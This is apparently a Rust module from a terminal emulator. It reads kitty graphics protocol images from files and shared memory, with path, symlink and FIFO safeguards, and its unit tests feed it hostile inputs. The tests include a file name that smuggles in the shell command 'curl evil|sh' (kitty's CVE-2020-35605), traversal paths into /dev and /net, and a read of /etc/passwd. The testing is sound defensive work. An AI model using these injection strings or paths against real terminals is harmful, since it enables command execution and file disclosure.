//! The part of the kitty graphics protocol Thurm handles itself: transmissions from a file,
//! a temporary file or shared memory. libghostty-vt implements the protocol, but every copy
//! of a pane's terminal (the daemon's, each app's) parses the same stream, and a temporary
//! file or shared memory object can be read only once (it is deleted after reading). So Thurm
//! reads it, and turns the command into a direct transmission of the bytes it read, which
//! every copy then parses the same way.

use std::io::{Read, Seek};
use std::os::unix::fs::OpenOptionsExt;
use std::sync::Arc;

use base64::Engine;

/// A decoded image, sent to clients once per client.
#[derive(Clone, Debug)]
pub struct Image {
    pub id: u32,
    pub width: u32,
    pub height: u32,
    /// Straight RGBA8.
    pub rgba: Arc<Vec<u8>>,
}

/// What to do with a transmission taken out of the stream.
#[derive(Debug, PartialEq, Eq)]
pub enum Media {
    /// Feed (and forward) these escape sequences instead: the same command as a direct
    /// transmission.
    Direct(Vec<u8>),
    /// Answer the program (an error), feed nothing.
    Reply(Vec<u8>),
    /// A chunk of a transmission that isn't complete yet.
    Wait,
    /// Nothing to do (not a transmission, or a silent error).
    Drop,
}

/// Reads file / shared memory transmissions, collecting chunked ones.
pub struct MediaReader {
    /// Control data and base64 payload of a chunked transmission so far.
    pending: Option<(Vec<u8>, Vec<u8>)>,
    /// Most bytes one transmission may read (the image memory limit).
    max_bytes: usize,
    /// False for a copy of a pane's terminal fed another machine's stream (the app's): it
    /// must never read this machine's files for it.
    enabled: bool,
}

impl Default for MediaReader {
    fn default() -> Self {
        MediaReader {
            pending: None,
            max_bytes: 320 * 1024 * 1024,
            enabled: true,
        }
    }
}

/// Base64 bytes per chunk of the direct transmissions we write (the protocol's 4096).
const CHUNK: usize = 4096;
/// Most base64 bytes of a file or shared memory name (chunks included).
const MAX_NAME_PAYLOAD: usize = 4096;
/// Where reading a file can block or reach other machines (automounts, devices, mounted
/// volumes, kernel files). Checked on every step of resolving a path, before touching it.
const FORBIDDEN_ROOTS: &[&str] = &[
    "/dev",
    "/net",
    "/Volumes",
    "/System/Volumes",
    "/proc",
    "/sys",
];
/// Allowed under /dev for temporary files (Linux shared memory).
const DEV_SHM: &str = "/dev/shm";
/// Most symlinks followed while resolving one path.
const MAX_LINKS: usize = 40;

impl MediaReader {
    pub fn set_max_bytes(&mut self, max: usize) {
        self.max_bytes = max;
    }

    pub fn set_enabled(&mut self, enabled: bool) {
        self.enabled = enabled;
        self.pending = None;
    }

    /// `body` is an APC body taken out of the stream (`G` + control data `;` payload).
    pub fn handle(&mut self, body: &[u8]) -> Media {
        let Some(body) = body.strip_prefix(b"G") else {
            return Media::Drop;
        };
        let (ctl, payload) = match memchr::memchr(b';', body) {
            Some(i) => (&body[..i], &body[i + 1..]),
            None => (body, &[][..]),
        };
        let more = key(ctl, b'm') == Some(b"1");
        // A command of its own (not a continuation chunk) abandons an unfinished one.
        if key(ctl, b't').is_some() || key(ctl, b'a').is_some() {
            self.pending = None;
        }
        // Checked before copying anything: a name is short.
        let so_far = self.pending.as_ref().map_or(0, |(_, data)| data.len());
        if so_far.saturating_add(payload.len()) > MAX_NAME_PAYLOAD {
            let first = self
                .pending
                .take()
                .map_or_else(|| ctl.to_vec(), |(first, _)| first);
            return reply(&first, err("EINVAL", "file name too long"))
                .map_or(Media::Drop, Media::Reply);
        }
        let (ctl, payload) = match self.pending.take() {
            Some((first, mut data)) => {
                data.extend_from_slice(payload);
                (first, data)
            }
            None => (ctl.to_vec(), payload.to_vec()),
        };
        if more {
            self.pending = Some((ctl, payload));
            return Media::Wait;
        }
        if !self.enabled {
            return Media::Drop;
        }
        match read(&ctl, &payload, self.max_bytes) {
            Ok(raw) => Media::Direct(direct_transmission(&ctl, &raw)),
            Err(e) => reply(&ctl, e).map_or(Media::Drop, Media::Reply),
        }
    }
}

/// An error code and message. Both are fixed strings: a reply is written to the program's
/// input, so it must never echo anything the program sent (a file name could hold a command
/// line for the shell to run once the program exits).
type Err = (&'static str, &'static str);

fn err(code: &'static str, msg: &'static str) -> Err {
    (code, msg)
}

/// The value of key `k` in kitty control data.
fn key(ctl: &[u8], k: u8) -> Option<&[u8]> {
    ctl.split(|&b| b == b',').find_map(|kv| match kv {
        [c, b'=', v @ ..] if *c == k => Some(v),
        _ => None,
    })
}

fn num(ctl: &[u8], k: u8) -> Option<usize> {
    std::str::from_utf8(key(ctl, k)?).ok()?.parse().ok()
}

/// The bytes a file / temporary file / shared memory transmission refers to.
fn read(ctl: &[u8], payload: &[u8], max: usize) -> Result<Vec<u8>, Err> {
    let clean: Vec<u8> = payload
        .iter()
        .copied()
        .filter(|b| !b.is_ascii_whitespace())
        .collect();
    let name = base64::engine::general_purpose::STANDARD
        .decode(&clean)
        .ok()
        .and_then(|b| String::from_utf8(b).ok())
        .ok_or_else(|| err("EINVAL", "bad file name"))?;
    let (offset, size) = (num(ctl, b'O').unwrap_or(0), num(ctl, b'S'));
    match key(ctl, b't').and_then(|m| m.first()) {
        Some(b'f') => read_file(&name, offset, size, max, false),
        Some(b't') => {
            if !is_temp_graphics_file(&name) {
                return Err(err("EPERM", "not a temporary graphics file"));
            }
            let bytes = read_file(&name, offset, size, max, true);
            // Only a regular file (not a link to one) is deleted.
            if std::fs::symlink_metadata(&name).is_ok_and(|m| m.file_type().is_file()) {
                let _ = std::fs::remove_file(&name);
            }
            bytes
        }
        Some(b's') => read_shm(&name, offset, size, max),
        _ => Err(err("EINVAL", "unknown transmission medium")),
    }
}

/// The same command as a direct transmission of `raw`, in protocol-sized chunks: keys other
/// than `t`, `S`, `O` and `m` are kept.
fn direct_transmission(ctl: &[u8], raw: &[u8]) -> Vec<u8> {
    let mut keys: Vec<&[u8]> = ctl
        .split(|&b| b == b',')
        .filter(|kv| !kv.is_empty() && !matches!(kv.first(), Some(b't' | b'S' | b'O' | b'm')))
        .collect();
    keys.push(b"t=d");
    let quiet = key(ctl, b'q');
    let data = base64::engine::general_purpose::STANDARD.encode(raw);
    let chunks: Vec<&[u8]> = if data.is_empty() {
        vec![&[][..]]
    } else {
        data.as_bytes().chunks(CHUNK).collect()
    };
    let mut out = Vec::with_capacity(data.len() + chunks.len() * 16 + ctl.len());
    for (i, chunk) in chunks.iter().enumerate() {
        let last = i + 1 == chunks.len();
        out.extend_from_slice(b"\x1b_G");
        if i == 0 {
            out.extend_from_slice(&keys.join(&b","[..]));
            out.push(b',');
        } else if let Some(q) = quiet {
            out.extend_from_slice(b"q=");
            out.extend_from_slice(q);
            out.push(b',');
        }
        out.extend_from_slice(if last { b"m=0" } else { b"m=1" });
        out.push(b';');
        out.extend_from_slice(chunk);
        out.extend_from_slice(b"\x1b\\");
    }
    out
}

/// The error response for a transmission, unless the program asked for quiet.
fn reply(ctl: &[u8], (code, msg): Err) -> Option<Vec<u8>> {
    if num(ctl, b'q') == Some(2) {
        return None;
    }
    let id = num(ctl, b'i').unwrap_or(0);
    let number = num(ctl, b'I').unwrap_or(0);
    if id == 0 && number == 0 {
        return None;
    }
    let mut fields = Vec::new();
    if id != 0 {
        fields.push(format!("i={id}"));
    }
    if number != 0 {
        fields.push(format!("I={number}"));
    }
    if let Some(p) = num(ctl, b'p').filter(|&p| p != 0) {
        fields.push(format!("p={p}"));
    }
    // Fixed strings already; keep them printable ASCII regardless.
    let text: String = format!("{code}:{msg}")
        .chars()
        .filter(|c| c.is_ascii_graphic() || *c == ' ')
        .collect();
    Some(format!("\x1b_G{};{text}\x1b\\", fields.join(",")).into_bytes())
}

/// The `len` bytes to read from offset `offset` of an object of `total` bytes, at most `max`.
fn span(total: usize, offset: usize, size: Option<usize>, max: usize) -> Result<usize, Err> {
    if offset > total {
        return Err(err("EINVAL", "offset past the end"));
    }
    let len = size.unwrap_or(total - offset).min(total - offset);
    if len > max {
        return Err(err("EFBIG", "image data too large"));
    }
    Ok(len)
}

/// Reads and unlinks a POSIX shared memory object (`t=s`), as the protocol requires.
fn read_shm(name: &str, offset: usize, size: Option<usize>, max: usize) -> Result<Vec<u8>, Err> {
    let rest = name.strip_prefix('/').unwrap_or(name);
    if rest.is_empty() || name.len() > 255 || rest.contains('/') {
        return Err(err("EINVAL", "bad shared memory name"));
    }
    let cname =
        std::ffi::CString::new(name).map_err(|_| err("EINVAL", "bad shared memory name"))?;
    let fd = unsafe { libc::shm_open(cname.as_ptr(), libc::O_RDONLY, 0) };
    if fd < 0 {
        return Err(err("EBADF", "cannot open the shared memory"));
    }
    let result = (|| {
        let mut st: libc::stat = unsafe { std::mem::zeroed() };
        if unsafe { libc::fstat(fd, &mut st) } != 0 {
            return Err(err("EBADF", "fstat failed"));
        }
        let total = st.st_size.max(0) as usize;
        let len = span(total, offset, size, max)?;
        if len == 0 {
            return Ok(Vec::new());
        }
        let map = unsafe {
            libc::mmap(
                std::ptr::null_mut(),
                total,
                libc::PROT_READ,
                libc::MAP_SHARED,
                fd,
                0,
            )
        };
        if map == libc::MAP_FAILED {
            return Err(err("EBADF", "mmap failed"));
        }
        let bytes =
            unsafe { std::slice::from_raw_parts((map as *const u8).add(offset), len) }.to_vec();
        unsafe { libc::munmap(map, total) };
        Ok(bytes)
    })();
    unsafe {
        libc::close(fd);
        libc::shm_unlink(cname.as_ptr());
    }
    result
}

fn is_temp_graphics_file(path: &str) -> bool {
    if !path.contains("tty-graphics-protocol") {
        return false;
    }
    let mut dirs = vec![
        "/tmp/".to_owned(),
        "/dev/shm/".to_owned(),
        "/private/tmp/".to_owned(),
        "/var/folders/".to_owned(),
        "/private/var/folders/".to_owned(),
    ];
    if let Ok(t) = std::env::var("TMPDIR") {
        dirs.push(if t.ends_with('/') { t } else { format!("{t}/") });
    }
    !path.contains("..") && dirs.iter().any(|d| path.starts_with(d.as_str()))
}

/// Whether `path` (absolute, without `.` or `..`) is on or under a forbidden root.
fn forbidden(path: &std::path::Path, allow_dev_shm: bool) -> bool {
    // /dev itself only as the step on the way to /dev/shm.
    if allow_dev_shm && (path == std::path::Path::new("/dev") || path.starts_with(DEV_SHM)) {
        return false;
    }
    FORBIDDEN_ROOTS.iter().any(|root| path.starts_with(root))
}

/// `path` with `.`, `..` and every symlink but the last component resolved, like realpath(3),
/// except that each step is checked against the forbidden roots before it is looked at (so
/// `/tmp/../net/host/x`, or a directory symlink into `/net`, never triggers an automount).
fn resolve(path: &str, allow_dev_shm: bool) -> Result<std::path::PathBuf, Err> {
    use std::path::{Component, Path, PathBuf};
    let denied = || err("EPERM", "file not allowed");
    if !path.starts_with('/') {
        return Err(denied());
    }
    let mut todo: std::collections::VecDeque<std::ffi::OsString> = Path::new(path)
        .components()
        .filter_map(|c| match c {
            Component::Normal(s) => Some(s.to_owned()),
            Component::ParentDir => Some("..".into()),
            _ => None,
        })
        .collect();
    let mut resolved = PathBuf::from("/");
    let mut links = 0;
    while let Some(part) = todo.pop_front() {
        if part == ".." {
            resolved.pop();
            continue;
        }
        let next = resolved.join(&part);
        if forbidden(&next, allow_dev_shm) {
            return Err(denied());
        }
        // The last component is opened with O_NOFOLLOW instead.
        if todo.is_empty() {
            resolved = next;
            break;
        }
        let meta =
            std::fs::symlink_metadata(&next).map_err(|_| err("EBADF", "cannot open the file"))?;
        if !meta.file_type().is_symlink() {
            resolved = next;
            continue;
        }
        links += 1;
        if links > MAX_LINKS {
            return Err(err("ELOOP", "too many symbolic links"));
        }
        let target = std::fs::read_link(&next).map_err(|_| err("EBADF", "cannot open the file"))?;
        if target.is_absolute() {
            resolved = PathBuf::from("/");
        }
        for c in target.components().rev() {
            match c {
                Component::Normal(s) => todo.push_front(s.to_owned()),
                Component::ParentDir => todo.push_front("..".into()),
                _ => {}
            }
        }
    }
    if forbidden(&resolved, allow_dev_shm) {
        return Err(denied());
    }
    Ok(resolved)
}

/// `allow_dev_shm`: temporary graphics files may be in /dev/shm.
fn read_file(
    path: &str,
    offset: usize,
    size: Option<usize>,
    max: usize,
    allow_dev_shm: bool,
) -> Result<Vec<u8>, Err> {
    let path = resolve(path, allow_dev_shm)?;
    // Never blocks on open (a FIFO without a writer) and never follows a final symlink; only
    // regular files are read.
    let mut f = std::fs::OpenOptions::new()
        .read(true)
        .custom_flags(libc::O_NONBLOCK | libc::O_NOFOLLOW | libc::O_CLOEXEC)
        .open(&path)
        .map_err(|_| err("EBADF", "cannot open the file"))?;
    let meta = f
        .metadata()
        .map_err(|_| err("EBADF", "cannot stat the file"))?;
    if !meta.is_file() {
        return Err(err("EBADF", "not a regular file"));
    }
    let total = usize::try_from(meta.len()).unwrap_or(usize::MAX);
    let len = span(total, offset, size, max)?;
    f.seek(std::io::SeekFrom::Start(offset as u64))
        .map_err(|_| err("EBADF", "cannot read the file"))?;
    let mut buf = Vec::with_capacity(len);
    f.take(len as u64)
        .read_to_end(&mut buf)
        .map_err(|_| err("EBADF", "cannot read the file"))?;
    Ok(buf)
}

/// PNG to straight RGBA8 (libghostty-vt calls this for `f=100` images).
pub fn decode_png(data: &[u8]) -> Option<(u32, u32, Vec<u8>)> {
    let mut decoder = png::Decoder::new(std::io::Cursor::new(data));
    decoder.set_transformations(png::Transformations::EXPAND | png::Transformations::STRIP_16);
    let mut reader = decoder.read_info().ok()?;
    let (w, h) = {
        let info = reader.info();
        (info.width, info.height)
    };
    // 10000 pixels a side, and at most 256 MiB decoded.
    if w > 10000 || h > 10000 || (w as usize) * (h as usize) * 4 > 256 << 20 {
        return None;
    }
    let mut buf = vec![0; reader.output_buffer_size()?];
    let frame = reader.next_frame(&mut buf).ok()?;
    buf.truncate(frame.buffer_size());
    let px = (w * h) as usize;
    let rgba = match frame.color_type {
        png::ColorType::Rgba => buf,
        png::ColorType::Rgb => buf
            .as_chunks::<3>()
            .0
            .iter()
            .flat_map(|&[r, g, b]| [r, g, b, 255])
            .collect(),
        png::ColorType::GrayscaleAlpha => buf
            .as_chunks::<2>()
            .0
            .iter()
            .flat_map(|&[g, a]| [g, g, g, a])
            .collect(),
        png::ColorType::Grayscale => buf.iter().flat_map(|&g| [g, g, g, 255]).collect(),
        png::ColorType::Indexed => return None,
    };
    (rgba.len() >= px * 4).then_some((w, h, rgba))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn b64(s: &[u8]) -> String {
        base64::engine::general_purpose::STANDARD.encode(s)
    }

    #[test]
    fn file_becomes_direct_chunks() {
        let dir = std::env::temp_dir().join(format!("thurm-kitty-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("img.rgba");
        let raw = vec![7u8; 5000];
        std::fs::write(&path, &raw).unwrap();
        let body = format!(
            "Ga=T,t=f,f=32,s=25,v=50,i=3,q=1,S=5000;{}",
            b64(path.to_str().unwrap().as_bytes())
        );
        let Media::Direct(out) = MediaReader::default().handle(body.as_bytes()) else {
            panic!("not direct");
        };
        let text = String::from_utf8(out).unwrap();
        let chunks: Vec<&str> = text.split("\x1b\\").filter(|c| !c.is_empty()).collect();
        assert_eq!(chunks.len(), 2, "{text}");
        assert!(chunks[0].starts_with("\x1b_Ga=T,f=32,s=25,v=50,i=3,q=1,t=d,m=1;"));
        assert!(chunks[1].starts_with("\x1b_Gq=1,m=0;"));
        let data: String = chunks
            .iter()
            .map(|c| c.split(';').nth(1).unwrap())
            .collect();
        let decoded = base64::engine::general_purpose::STANDARD
            .decode(data)
            .unwrap();
        assert_eq!(decoded, raw);
        // Regular files stay.
        assert!(path.exists());
        std::fs::remove_dir_all(dir).unwrap();
    }

    fn reply_text(m: Media) -> String {
        match m {
            Media::Reply(r) => String::from_utf8(r).unwrap(),
            other => panic!("no reply: {other:?}"),
        }
    }

    #[test]
    fn error_replies_never_echo_the_name() {
        // A file name holding a command line for the shell (kitty's CVE-2020-35605).
        let name = b64(b"/nonexistent/x\rcurl evil|sh\r\x1b\\");
        let text =
            reply_text(MediaReader::default().handle(format!("Ga=t,t=f,i=1;{name}").as_bytes()));
        assert_eq!(text, "\x1b_Gi=1;EBADF:cannot open the file\x1b\\");
        let text = reply_text(
            MediaReader::default()
                .handle(format!("Ga=t,t=s,i=1;{}", b64(b"/thurm-none\rx")).as_bytes()),
        );
        assert!(
            !text.contains('\r') && !text.contains("thurm-none"),
            "{text:?}"
        );
    }

    #[test]
    fn hostile_names_and_offsets_do_not_panic() {
        let mut r = MediaReader::default();
        // Multi-byte first character of a shared memory name.
        let text =
            reply_text(r.handle(format!("Ga=t,t=s,i=1;{}", b64("é/x".as_bytes())).as_bytes()));
        assert!(text.contains("EINVAL"), "{text}");
        let text = reply_text(r.handle(format!("Ga=t,t=s,i=1;{}", b64("é".as_bytes())).as_bytes()));
        assert!(!text.is_empty());

        let dir = std::env::temp_dir().join(format!("thurm-kitty-off-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("data");
        std::fs::write(&path, [1u8; 100]).unwrap();
        let name = b64(path.to_str().unwrap().as_bytes());
        // Offset plus size overflows.
        let text = reply_text(
            r.handle(format!("Ga=t,t=f,i=1,O=18446744073709551615,S=10;{name}").as_bytes()),
        );
        assert!(text.contains("EINVAL"), "{text}");
        let Media::Direct(_) =
            r.handle(format!("Ga=t,t=f,i=1,O=10,S=18446744073709551615;{name}").as_bytes())
        else {
            panic!("size is clamped to the file");
        };
        // More than the image memory limit.
        r.set_max_bytes(50);
        let text = reply_text(r.handle(format!("Ga=t,t=f,i=1;{name}").as_bytes()));
        assert!(text.contains("EFBIG"), "{text}");
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn only_regular_files_are_read() {
        let dir = std::env::temp_dir().join(format!("thurm-kitty-fifo-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let fifo = dir.join("fifo");
        let c = std::ffi::CString::new(fifo.to_str().unwrap()).unwrap();
        assert_eq!(unsafe { libc::mkfifo(c.as_ptr(), 0o600) }, 0);
        let link = dir.join("link");
        std::fs::write(dir.join("real"), [0u8; 4]).unwrap();
        std::os::unix::fs::symlink(dir.join("real"), &link).unwrap();
        let mut r = MediaReader::default();
        let started = std::time::Instant::now();
        // A FIFO without a writer must not block the parser.
        let text = reply_text(
            r.handle(format!("Ga=t,t=f,i=1;{}", b64(fifo.to_str().unwrap().as_bytes())).as_bytes()),
        );
        assert!(text.contains("EBADF"), "{text}");
        assert!(started.elapsed() < std::time::Duration::from_secs(1));
        let text = reply_text(
            r.handle(format!("Ga=t,t=f,i=1;{}", b64(link.to_str().unwrap().as_bytes())).as_bytes()),
        );
        assert!(text.contains("EBADF"), "{text}");
        for bad in ["/dev/zero", "/net/host/x", "relative/path"] {
            let text =
                reply_text(r.handle(format!("Ga=t,t=f,i=1;{}", b64(bad.as_bytes())).as_bytes()));
            assert!(text.contains("EPERM"), "{bad}: {text}");
        }
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn path_aliases_cannot_reach_forbidden_roots() {
        let dir = std::env::temp_dir().join(format!("thurm-kitty-alias-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        // A directory symlink into /dev, and one into /net (not followed, never looked up).
        std::os::unix::fs::symlink("/dev", dir.join("devlink")).unwrap();
        std::os::unix::fs::symlink("/net/host", dir.join("netlink")).unwrap();
        std::os::unix::fs::symlink("../../../../../../../../dev", dir.join("rel")).unwrap();
        let d = dir.to_str().unwrap();
        let mut r = MediaReader::default();
        for bad in [
            "/usr/../net/host/x".to_owned(),
            "/tmp/../../dev/zero".to_owned(),
            format!("{d}/devlink/zero"),
            format!("{d}/netlink/x"),
            format!("{d}/rel/zero"),
        ] {
            let text =
                reply_text(r.handle(format!("Ga=t,t=f,i=1;{}", b64(bad.as_bytes())).as_bytes()));
            assert!(text.contains("EPERM"), "{bad}: {text}");
        }
        // Symlinks elsewhere still resolve.
        std::fs::create_dir_all(dir.join("real")).unwrap();
        std::fs::write(dir.join("real/img"), [9u8; 8]).unwrap();
        std::os::unix::fs::symlink(dir.join("real"), dir.join("ok")).unwrap();
        let body = format!(
            "Ga=t,t=f,i=1;{}",
            b64(format!("{d}/ok/../ok/img").as_bytes())
        );
        assert!(matches!(r.handle(body.as_bytes()), Media::Direct(_)));
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn temporary_files_in_dev_shm() {
        let path = format!(
            "/dev/shm/tty-graphics-protocol-thurm-{}",
            std::process::id()
        );
        std::fs::write(&path, [5u8; 12]).unwrap();
        let mut r = MediaReader::default();
        let body = format!("Ga=t,t=t,i=1;{}", b64(path.as_bytes()));
        assert!(matches!(r.handle(body.as_bytes()), Media::Direct(_)));
        assert!(
            !std::path::Path::new(&path).exists(),
            "temporary files are deleted"
        );
        // Other files there are not readable as plain files.
        let body = format!("Ga=t,t=f,i=1;{}", b64(b"/dev/shm/x"));
        assert!(reply_text(r.handle(body.as_bytes())).contains("EPERM"));
    }

    #[test]
    fn dev_is_only_a_step_towards_dev_shm() {
        use std::path::Path;
        assert!(!forbidden(Path::new("/dev"), true));
        assert!(!forbidden(
            Path::new("/dev/shm/tty-graphics-protocol-x"),
            true
        ));
        assert!(forbidden(Path::new("/dev/zero"), true));
        assert!(forbidden(Path::new("/dev/fd/0"), true));
        assert!(forbidden(Path::new("/dev"), false));
        assert!(forbidden(Path::new("/dev/shm/x"), false));
    }

    #[test]
    fn oversized_first_chunk_is_refused() {
        let mut r = MediaReader::default();
        let long = "A".repeat(MAX_NAME_PAYLOAD + 1);
        let text = reply_text(r.handle(format!("Ga=t,t=f,i=1;{long}").as_bytes()));
        assert!(text.contains("EINVAL"), "{text}");
    }

    #[test]
    fn chunk_limits_and_abandoned_chunks() {
        let mut r = MediaReader::default();
        let long = "A".repeat(3000);
        assert_eq!(
            r.handle(format!("Ga=t,t=f,i=1,m=1;{long}").as_bytes()),
            Media::Wait
        );
        let text = reply_text(r.handle(format!("Gm=1;{long}").as_bytes()));
        assert!(text.contains("EINVAL"), "{text}");
        // An unfinished transmission is dropped when a new command starts.
        assert_eq!(
            r.handle(format!("Ga=t,t=f,i=1,m=1;{}", b64(b"/nonex")).as_bytes()),
            Media::Wait
        );
        let text =
            reply_text(r.handle(format!("Ga=t,t=f,i=2;{}", b64(b"/nonexistent/y")).as_bytes()));
        assert!(text.starts_with("\x1b_Gi=2;"), "{text}");
    }

    #[test]
    fn disabled_reader_reads_nothing() {
        let dir = std::env::temp_dir().join(format!("thurm-kitty-off2-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("data");
        std::fs::write(&path, [1u8; 16]).unwrap();
        let mut r = MediaReader::default();
        r.set_enabled(false);
        let body = format!("Ga=t,t=f,i=1;{}", b64(path.to_str().unwrap().as_bytes()));
        assert_eq!(r.handle(body.as_bytes()), Media::Drop);
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn chunked_names_and_errors() {
        let mut r = MediaReader::default();
        let name = b64(b"/nonexistent/thurm-test");
        let (a, b) = name.split_at(8);
        assert_eq!(
            r.handle(format!("Ga=t,t=f,i=9,m=1;{a}").as_bytes()),
            Media::Wait
        );
        let Media::Reply(reply) = r.handle(format!("Gm=0;{b}").as_bytes()) else {
            panic!("no reply");
        };
        assert!(
            String::from_utf8(reply)
                .unwrap()
                .starts_with("\x1b_Gi=9;EBADF:")
        );
        // Temporary files must be in a temporary directory.
        let Media::Reply(reply) =
            r.handle(format!("Ga=t,t=t,i=9;{}", b64(b"/etc/passwd")).as_bytes())
        else {
            panic!("no reply");
        };
        assert!(String::from_utf8(reply).unwrap().contains("EPERM"));
        // Quiet errors.
        assert_eq!(
            r.handle(format!("Ga=t,t=f,i=9,q=2;{name}").as_bytes()),
            Media::Drop
        );
    }
}
